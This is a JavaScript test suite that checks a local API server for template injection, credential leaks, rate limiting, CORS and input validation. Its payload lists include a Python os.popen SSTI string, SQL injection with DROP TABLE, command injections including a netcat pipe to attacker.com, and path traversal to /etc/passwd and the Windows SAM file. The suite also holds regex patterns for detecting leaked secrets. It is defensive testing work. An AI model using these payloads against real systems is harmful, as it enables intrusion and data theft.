
/**
 * Comprehensive Security Validation Test Suite
 * Tests for SSTI, connection pools, information leaks, rate limiting, CORS, and input validation
 */

const axios = require('axios');
const { performance } = require('perf_hooks');

// Test configuration
const BASE_URL = process.env.BASE_URL || 'http://localhost:8000';
const TEST_TIMEOUT = 30000;

// Test results storage
const testResults = {
  timestamp: new Date().toISOString(),
  summary: {
    totalTests: 0,
    passed: 0,
    failed: 0,
    warnings: 0
  },
  tests: {}
};

// Helper functions
function logTestStart(testName) {
  console.log(`\n=== ${testName} ===`);
  testResults.tests[testName] = {
    status: 'running',
    details: []
  };
}

function logTestResult(testName, passed, details, severity = 'info') {
  testResults.summary.totalTests++;
  if (passed) {
    testResults.summary.passed++;
    console.log(`✅ PASSED: ${details}`);
  } else {
    if (severity === 'critical') {
      testResults.summary.failed++;
      console.log(`❌ FAILED: ${details}`);
    } else {
      testResults.summary.warnings++;
      console.log(`⚠️  WARNING: ${details}`);
    }
  }
  
  testResults.tests[testName].details.push({
    passed,
    message: details,
    severity,
    timestamp: new Date().toISOString()
  });
}

function finalizeTest(testName, overallPassed) {
  testResults.tests[testName].status = overallPassed ? 'passed' : 'failed';
  testResults.tests[testName].completedAt = new Date().toISOString();
}

// Security validation functions
async function testSSTIVulnerabilities() {
  const testName = 'SSTI (Server-Side Template Injection) Testing';
  logTestStart(testName);
  
  let overallPassed = true;
  
  // SSTI payloads to test
  const sstiPayloads = [
    '{{7*7}}',
    '{{7*\'7\'}}',
    '${7*7}',
    '#{7*7}',
    '{{config}}',
    '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
    '{{\'\'.__class__.__mro__[2].__subclasses__()}}',
    '{{request.environ}}',
    '{{request.cookies}}',
    '{{request.headers}}',
    '{{request.form}}',
    '{{request.args}}',
    '{{request.values}}',
    '{{request.json}}',
    '{{request.data}}',
    '{{request.files}}',
    '{{request.stream}}',
    '{{request.view_args}}',
    '{{request.blueprint}}',
    '{{request.endpoint}}',
    '{{request.url}}',
    '{{request.url_root}}',
    '{{request.host_url}}',
    '{{request.host}}',
    '{{request.path}}',
    '{{request.full_path}}',
    '{{request.script_root}}',
    '{{request.base_url}}',
    '{{request.url_charset}}',
    '{{request.url_scheme}}',
    '{{request.is_secure}}',
    '{{request.is_json}}',
    '{{request.mimetype}}',
    '{{request.content_type}}',
    '{{request.content_length}}',
    '{{request.method}}',
    '{{request.scheme}}',
    '{{request.remote_addr}}',
    '{{request.access_route}}'
  ];
  
  // Endpoints to test
  const endpoints = [
    '/api/agents',
    '/api/chat', 
    '/api/endpoints',
    '/api/health/core',
    '/api/health/db',
    '/api/health/redis'
  ];
  
  for (const endpoint of endpoints) {
    for (const payload of sstiPayloads) {
      try {
        // Test GET with payload in query parameters
        const getResponse = await axios.get(`${BASE_URL}${endpoint}`, {
          params: { test: payload, input: payload, data: payload },
          timeout: 10000,
          validateStatus: () => true // Don't throw on any status code
        });
        
        // Check if payload was executed (should NOT contain 49 or other calculated results)
        const responseText = getResponse.data.toString().toLowerCase();
        if (responseText.includes('49') && payload.includes('7*7')) {
          logTestResult(testName, false, `SSTI VULNERABILITY: ${endpoint} GET - Payload executed: ${payload}`, 'critical');
          overallPassed = false;
        } else {
          logTestResult(testName, true, `SSTI Safe: ${endpoint} GET - Payload sanitized: ${payload.substring(0, 30)}...`);
        }
        
        // Test POST with payload in body
        const postResponse = await axios.post(`${BASE_URL}${endpoint}`, {
          input: payload,
          data: payload,
          template: payload,
          content: payload
        }, {
          timeout: 10000,
          validateStatus: () => true
        });
        
        const postResponseText = postResponse.data.toString().toLowerCase();
        if (postResponseText.includes('49') && payload.includes('7*7')) {
          logTestResult(testName, false, `SSTI VULNERABILITY: ${endpoint} POST - Payload executed: ${payload}`, 'critical');
          overallPassed = false;
        } else {
          logTestResult(testName, true, `SSTI Safe: ${endpoint} POST - Payload sanitized: ${payload.substring(0, 30)}...`);
        }
        
      } catch (error) {
        // Request blocked/error is considered safe
        logTestResult(testName, true, `SSTI Safe: ${endpoint} - Request blocked/error: ${error.message.substring(0, 50)}`);
      }
    }
  }
  
  finalizeTest(testName, overallPassed);
  return overallPassed;
}

async function testConnectionPoolStress() {
  const testName = 'Connection Pool Stress Testing';
  logTestStart(testName);
  
  const results = {
    totalRequests: 1000,
    successfulRequests: 0,
    failedRequests: 0,
    connectionErrors: 0,
    timeoutErrors: 0,
    responseTimes: []
  };
  
  const startTime = performance.now();
  
  // Execute 1000 concurrent requests
  console.log('Starting connection pool stress test with 1000 concurrent requests...');
  
  const requests = Array.from({ length: results.totalRequests }, async (_, index) => {
    const requestStart = performance.now();
    try {
      const response = await axios.get(`${BASE_URL}/api/health/core`, {
        timeout: 5000,
        validateStatus: () => true
      });
      
      const requestEnd = performance.now();
      results.responseTimes.push(requestEnd - requestStart);
      
      if (response.status === 200) {
        results.successfulRequests++;
        console.log(`✅ Request ${index}: Success (${(requestEnd - requestStart).toFixed(2)}ms)`);
      } else {
        results.failedRequests++;
        console.log(`❌ Request ${index}: Failed (${response.status})`);
      }
    } catch (error) {
      if (error.code === 'ECONNREFUSED' || error.code === 'ENOTFOUND') {
        results.connectionErrors++;
        console.log(`❌ Request ${index}: Connection Error`);
      } else if (error.code === 'ETIMEDOUT') {
        results.timeoutErrors++;
        console.log(`⏰ Request ${index}: Timeout`);
      } else {
        results.failedRequests++;
        console.log(`❌ Request ${index}: Error - ${error.message.substring(0, 50)}`);
      }
    }
  });
  
  await Promise.all(requests);
  
  const endTime = performance.now();
  const totalTime = endTime - startTime;
  
  // Calculate metrics
  const errorRate = ((results.connectionErrors + results.timeoutErrors) / results.totalRequests) * 100;
  const avgResponseTime = results.responseTimes.length > 0 
    ? results.responseTimes.reduce((a, b) => a + b, 0) / results.responseTimes.length 
    : 0;
  
  console.log(`\nStress Test Results:`);
  console.log(`Total Requests: ${results.totalRequests}`);
  console.log(`Successful: ${results.successfulRequests}`);
  console.log(`Failed: ${results.failedRequests}`);
  console.log(`Connection Errors: ${results.connectionErrors}`);
  console.log(`Timeout Errors: ${results.timeoutErrors}`);
  console.log(`Error Rate: ${errorRate.toFixed(2)}%`);
  console.log(`Average Response Time: ${avgResponseTime.toFixed(2)}ms`);
  console.log(`Total Test Time: ${totalTime.toFixed(2)}ms`);
  
  // Test criteria: Must have < 5% connection errors
  const passed = errorRate < 5.0;
  if (passed) {
    logTestResult(testName, true, `Connection pool stress test PASSED: Error rate ${errorRate.toFixed(2)}% below 5% threshold`);
  } else {
    logTestResult(testName, false, `Connection pool stress test FAILED: Error rate ${errorRate.toFixed(2)}% exceeds 5% threshold`, 'critical');
  }
  
  finalizeTest(testName, passed);
  return passed;
}

async function testSensitiveInformationLeaks() {
  const testName = 'Sensitive Information Leak Testing';
  logTestStart(testName);
  
  let overallPassed = true;
  
  // Patterns to check for in responses
  const sensitivePatterns = [
    /password\s*[:=]\s*['"]?[\w@#$%^&*]+['"]?/i,
    /token\s*[:=]\s*['"]?[\w\-]+['"]?/i,
    /secret\s*[:=]\s*['"]?[\w@#$%^&*]+['"]?/i,
    /api[_-]?key\s*[:=]\s*['"]?[\w\-]+['"]?/i,
    /auth[_-]?key\s*[:=]\s*['"]?[\w\-]+['"]?/i,
    /private[_-]?key\s*[:=]\s*['"]?[\w\-]+['"]?/i,
    /connection[_-]?string\s*[:=]\s*['"]?[\w\-@#$%^&*]+['"]?/i,
    /database[_-]?password\s*[:=]\s*['"]?[\w\-@#$%^&*]+['"]?/i,
    /redis[_-]?password\s*[:=]\s*['"]?[\w\-@#$%^&*]+['"]?/i,
    /admin[_-]?password\s*[:=]\s*['"]?[\w\-@#$%^&*]+['"]?/i,
    /bearer\s+[\w\-]+/i,
    /basic\s+[a-zA-Z0-9+/=]+/i,
  ];
  
  // Test scenarios
  const testScenarios = [
    {
      name: 'Database Connection Error',
      request: () => axios.get(`${BASE_URL}/api/health/db`, { timeout: 5000, validateStatus: () => true }),
      description: 'Check if database connection errors leak credentials'
    },
    {
      name: 'Redis Connection Error', 
      request: () => axios.get(`${BASE_URL}/api/health/redis`, { timeout: 5000, validateStatus: () => true }),
      description: 'Check if Redis connection errors leak credentials'
    },
    {
      name: 'Invalid Authentication',
      request: () => axios.get(`${BASE_URL}/api/agents`, {
        headers: { 'Authorization': 'Bearer invalid_token_12345' },
        timeout: 5000,
        validateStatus: () => true
      }),
      description: 'Check if auth errors leak sensitive data'
    },
    {
      name: 'Malformed JSON Request',
      request: () => axios.post(`${BASE_URL}/api/chat`, 'invalid json {{{', {
        headers: { 'Content-Type': 'application/json' },
        timeout: 5000,
        validateStatus: () => true
      }),
      description: 'Check if parsing errors leak sensitive data'
    },
    {
      name: 'SQL Injection Attempt',
      request: () => axios.get(`${BASE_URL}/api/agents`, {
        params: { id: "1' OR '1'='1" },
        timeout: 5000,
        validateStatus: () => true
      }),
      description: 'Check if SQL errors leak database information'
    },
    {
      name: 'Path Traversal Attempt',
      request: () => axios.get(`${BASE_URL}/api/endpoints`, {
        params: { file: '../../../etc/passwd' },
        timeout: 5000,
        validateStatus: () => true
      }),
      description: 'Check if file errors leak system information'
    }
  ];
  
  for (const scenario of testScenarios) {
    try {
      console.log(`Testing: ${scenario.name}`);
      const response = await scenario.request();
      
      // Check response for sensitive information
      const responseText = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
      let foundSensitive = false;
      
      for (const pattern of sensitivePatterns) {
        const matches = responseText.match(pattern);
        if (matches) {
          foundSensitive = true;
          logTestResult(testName, false, `LEAK DETECTED: ${scenario.name} - Found ${matches.length} sensitive pattern matches: ${matches[0].substring(0, 50)}...`, 'critical');
          overallPassed = false;
          break;
        }
      }
      
      if (!foundSensitive) {
        logTestResult(testName, true, `No Leaks: ${scenario.name} - Response clean`);
      }
      
    } catch (error) {
      // Request blocked/error is considered safe
      logTestResult(testName, true, `No Leaks: ${scenario.name} - Request blocked/error: ${error.message.substring(0, 50)}`);
    }
  }
  
  finalizeTest(testName, overallPassed);
  return overallPassed;
}

async function testRateLimitingEffectiveness() {
  const testName = 'Rate Limiting Effectiveness Testing';
  logTestStart(testName);
  
  let overallPassed = true;
  
  console.log('Testing rate limiting with rapid sequential requests...');
  
  // Test rapid sequential requests to trigger rate limiting
  const testEndpoint = '/api/health/core';
  const rapidRequests = 20;
  let rateLimitedCount = 0;
  
  for (let i = 0; i < rapidRequests; i++) {
    try {
      const response = await axios.get(`${BASE_URL}${testEndpoint}`, {
        timeout: 5000,
        validateStatus: () => true
      });
      
      if (response.status === 429) {
        rateLimitedCount++;
        console.log(`✅ Request ${i}: Rate limited (429)`);
      } else if (response.status === 200) {
        console.log(`✅ Request ${i}: Success (200)`);
      } else {
        console.log(`❌ Request ${i}: Unexpected status ${response.status}`);
      }
      
    } catch (error) {
      console.log(`❌ Request ${i}: Error - ${error.message.substring(0, 50)}`);
    }
    
    // Small delay between requests
    await new Promise(resolve => setTimeout(resolve, 100));
  }
  
  if (rateLimitedCount > 0) {
    logTestResult(testName, true, `Rate limiting active: ${rateLimitedCount} requests rate-limited out of ${rapidRequests}`);
  } else {
    logTestResult(testName, false, `Rate limiting not working: No requests were rate-limited`, 'critical');
    overallPassed = false;
  }
  
  // Test rate limit headers
  try {
    const response = await axios.get(`${BASE_URL}${testEndpoint}`, { validateStatus: () => true });
    const hasRateLimitHeaders = response.headers['x-ratelimit-limit'] && 
                               response.headers['x-ratelimit-remaining'] &&
                               response.headers['x-ratelimit-reset'];
    
    if (hasRateLimitHeaders) {
      logTestResult(testName, true, `Rate limit headers present: Limit=${response.headers['x-ratelimit-limit']}`);
    } else {
      logTestResult(testName, false, `Rate limit headers missing`, 'warning');
    }
  } catch (error) {
    logTestResult(testName, false, `Cannot check rate limit headers: ${error.message}`, 'warning');
  }
  
  finalizeTest(testName, overallPassed);
  return overallPassed;
}

async function testCORSPolicyEnforcement() {
  const testName = 'CORS Policy Enforcement Testing';
  logTestStart(testName);
  
  let overallPassed = true;
  
  // Test CORS preflight request
  console.log('Testing CORS preflight request...');
  try {
    const preflightResponse = await axios.options(`${BASE_URL}/api/agents`, {
      headers: {
        'Origin': 'https://malicious-site.com',
        'Access-Control-Request-Method': 'POST',
        'Access-Control-Request-Headers': 'Content-Type'
      },
      validateStatus: () => true
    });
    
    const corsHeaders = {
      'Access-Control-Allow-Origin': preflightResponse.headers['access-control-allow-origin'],
      'Access-Control-Allow-Methods': preflightResponse.headers['access-control-allow-methods'],
      'Access-Control-Allow-Headers': preflightResponse.headers['access-control-allow-headers'],
      'Access-Control-Allow-Credentials': preflightResponse.headers['access-control-allow-credentials']
    };
    
    console.log('CORS Headers:', corsHeaders);
    
    // Check for wildcard in production (should not be allowed)
    const isProduction = process.env.NODE_ENV === 'production';
    if (isProduction && corsHeaders['Access-Control-Allow-Origin'] === '*') {
      logTestResult(testName, false, `CORS SECURITY ISSUE: Wildcard origin allowed in production`, 'critical');
      overallPassed = false;
    } else if (corsHeaders['Access-Control-Allow-Origin']) {
      logTestResult(testName, true, `CORS properly configured: Origin=${corsHeaders['Access-Control-Allow-Origin']}`);
    } else {
      logTestResult(testName, false, `CORS headers missing or invalid`, 'warning');
    }
    
  } catch (error) {
    logTestResult(testName, false, `CORS preflight test failed: ${error.message}`, 'warning');
  }
  
  // Test actual CORS request
  console.log('Testing CORS actual request...');
  try {
    const response = await axios.get(`${BASE_URL}/api/agents`, {
      headers: {
        'Origin': 'https://malicious-site.com'
      },
      validateStatus: () => true
    });
    
    const allowOrigin = response.headers['access-control-allow-origin'];
    if (allowOrigin && allowOrigin !== 'https://malicious-site.com') {
      logTestResult(testName, true, `CORS origin restriction working: Blocked malicious origin`);
    } else if (allowOrigin === 'https://malicious-site.com') {
      logTestResult(testName, false, `CORS SECURITY ISSUE: Malicious origin allowed`, 'critical');
      overallPassed = false;
    } else {
      logTestResult(testName, true, `CORS properly restricted: No access for unauthorized origin`);
    }
    
  } catch (error) {
    logTestResult(testName, true, `CORS properly blocked request: ${error.message.substring(0, 50)}`);
  }
  
  finalizeTest(testName, overallPassed);
  return overallPassed;
}

async function testInputValidationSecurity() {
  const testName = 'Input Validation Security Testing';
  logTestStart(testName);
  
  let overallPassed = true;
  
  // Malicious payloads to test
  const maliciousPayloads = [
    // XSS payloads
    { type: 'XSS', payload: '<script>alert("XSS")</script>', description: 'Basic XSS script tag' },
    { type: 'XSS', payload: '<img src=x onerror=alert("XSS")>', description: 'XSS via image onerror' },
    { type: 'XSS', payload: 'javascript:alert("XSS")', description: 'JavaScript protocol XSS' },
    { type: 'XSS', payload: '<svg onload=alert("XSS")>', description: 'XSS via SVG onload' },
    
    // SQL injection payloads
    { type: 'SQLi', payload: "' OR '1'='1", description: 'Basic SQL injection' },
    { type: 'SQLi', payload: "'; DROP TABLE users; --", description: 'SQL injection with DROP' },
    { type: 'SQLi', payload: "' UNION SELECT * FROM users --", description: 'SQL injection with UNION' },
    { type: 'SQLi', payload: "admin'--", description: 'SQL injection comment bypass' },
    
    // Command injection payloads
    { type: 'CMDi', payload: '; cat /etc/passwd', description: 'Command injection via semicolon' },
    { type: 'CMDi', payload: '&& whoami', description: 'Command injection via AND operator' },
    { type: 'CMDi', payload: '| nc attacker.com 4444', description: 'Command injection with pipe' },
    { type: 'CMDi', payload: '`whoami`', description: 'Command injection via backticks' },
    
    // Path traversal payloads
    { type: 'Path', payload: '../../../etc/passwd', description: 'Path traversal to /etc/passwd' },
    { type: 'Path', payload: '..\\..\\..\\windows\\system32\\config\\sam', description: 'Windows path traversal' },
    { type: 'Path', payload: '....//....//....//etc/passwd', description: 'Path traversal with double dots' },
    { type: 'Path', payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', description: 'URL encoded path traversal' }
  ];
  
  const endpoints = ['/api/agents', '/api/chat', '/api/endpoints'];
  
  for (const endpoint of endpoints) {
    for (const malicious of maliciousPayloads) {
      try {
        // Test GET with malicious payload
        const getResponse = await axios.get(`${BASE_URL}${endpoint}`, {
          params: {
            input: malicious.payload,
            data: malicious.payload,
            content: malicious.payload
          },
          timeout: 10000,
          validateStatus: () => true
        });
        
        // Check if payload was executed/reflected
        const responseText = getResponse.data.toString().toLowerCase();
        const payloadLower = malicious.payload.toLowerCase();
        
        // Check for dangerous patterns in response
        const dangerousPatterns = [
          /<script[^>]*>.*?<\/script>/i,  // Script tags
          /alert\s*\(/i,                  // Alert calls
          /javascript:/i,                 // JavaScript protocol
          /onerror\s*=/i,                 // Onerror events
          /onload\s*=/i,                  // Onload events
          /union\s+select/i,              // SQL UNION
          /drop\s+table/i,                // SQL DROP
          /cat\s+\/etc\/passwd/i,          // Command injection
          /whoami/i,                      // Command execution
          /system32/i,                    // Windows system files
          /etc\/passwd/i                   // Linux password file
        ];
        
        let foundDangerous = false;
        for (const pattern of dangerousPatterns) {
          if (pattern.test(responseText)) {
            foundDangerous = true;
            break;
          }
        }
        
        if (foundDangerous || responseText.includes(payloadLower)) {
          logTestResult(testName, false, `VALIDATION FAILED: ${endpoint} GET - ${malicious.type} payload executed/reflected: ${malicious.description}`, 'critical');
          overallPassed = false;
        } else {
          logTestResult(testName, true, `Input validation working: ${endpoint} GET - ${malicious.type} payload sanitized: ${malicious.description}`);
        }
        
        // Test POST with malicious payload
        const postResponse = await axios.post(`${BASE_URL}${endpoint}`, {
          input: malicious.payload,
          data: malicious.payload,
          content: malicious.payload,
          template: malicious.payload
        }, {
          timeout: 10000,
          validateStatus: () => true
        });
        
        const postResponseText = postResponse.data.toString().toLowerCase();
        let postFoundDangerous = false;
        for (const pattern of dangerousPatterns) {
          if (pattern.test(postResponseText)) {
            postFoundDangerous = true;
            break;
          }
        }
        
        if (postFoundDangerous || postResponseText.includes(payloadLower)) {
          logTestResult(testName, false, `VALIDATION FAILED: ${endpoint} POST - ${malicious.type} payload executed/reflected: ${malicious.description}`, 'critical');
          overallPassed = false;
        } else {
          logTestResult(testName, true, `Input validation working: ${endpoint} POST - ${malicious.type} payload sanitized: ${malicious.description}`);
        }
        
      } catch (error) {
        // Request blocked/error is considered safe
        logTestResult(testName, true, `Input validation working: ${endpoint} - Request blocked/error for ${malicious.type}: ${malicious.description}`);
      }
    }
  }
  
  finalizeTest(testName, overallPassed);
  return overallPassed;
}

// Main test execution function
async function runSecurityValidationTests() {
  console.log('🚀 Starting Comprehensive Security Validation Tests');
  console.log(`Base URL: ${BASE_URL}`);
  console.log(`Test Time: ${testResults.timestamp}`);
  console.log('='.repeat(60));
  
  // Check if server is running first
  try {
    await axios.get(`${BASE_URL}/api/health/core`, { timeout: 5000 });
    console.log('✅ Server is running - proceeding with tests');
  } catch (error) {
    console.error('❌ Server is not running - cannot execute tests');
    console.error('Please start the server first with: npm run dev or python -m resync.main');
    return;
  }
  
  // Run all security tests
  const tests = [
    testSSTIVulnerabilities,
    testConnectionPoolStress,
    testSensitiveInformationLeaks,
    testRateLimitingEffectiveness,
    testCORSPolicyEnforcement,
    testInputValidationSecurity
  ];
  
  for (const test of tests) {
    try {
      await test();
    } catch (error) {
      console.error(`Test execution error: ${error.message}`);
    }
    // Small delay between tests
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
  
  // Generate final report
  console.log('\n' + '='.repeat(60));
  console.log('📊 SECURITY VALIDATION TEST SUMMARY');
  console.log('='.repeat(60));
  console.log(`Total Tests: ${testResults.summary.totalTests}`);
  console.log(`✅ Passed: ${testResults.summary.passed}`);
  console.log(`❌ Failed: ${testResults.summary.failed}`);
  console.log(`⚠️  Warnings: ${testResults.summary.warnings}`);
  console.log(`Overall Security Score: ${((testResults.summary.passed / testResults.summary.totalTests) * 100).toFixed(1)}%`);
  
  // Security grade
  const score = (testResults.summary.passed / testResults.summary.totalTests) * 100;
  let grade = 'F';
  if (score >= 95) grade = 'A+';
  else if (score >= 90) grade = 'A';
  else if (score >= 85) grade = 'B+';
  else if (score >= 80) grade = 'B';
  else if (score >= 75) grade = 'C+';
  else if (score >= 70) grade = 'C';
  else if (score >= 65) grade = 'D';
  
  console.log(`Security Grade: ${grade}`);
  
  if (testResults.summary.failed === 0) {
    console.log('🎉 ALL SECURITY TESTS PASSED - System is secure!');
  } else {
    console.log(`⚠️  ${testResults.summary.failed} critical security issues found - Review required`);
  }
  
  // Save detailed results
  const fs = require('fs');
  const path = require('path');
  const reportPath = path.join(__dirname, 'security_validation_results.json');
  
  try {
    fs.writeFileSync(reportPath, JSON.stringify(testResults, null, 2));
    console.log(`\n📄 Detailed results saved to: ${reportPath}`);
  } catch (error) {
    console.error(`Could not save results file: ${error.message}`);
  }
  
  return testResults;
}

// Export for use in other test files
module.exports = {
  runSecurityValidationTests,
  testResults
};

// Run tests if this file is executed directly
if (require.main === module) {
  runSecurityValidationTests().catch(error => {
    console.error('Test execution failed:', error);
    process.exit(1);
  });
}
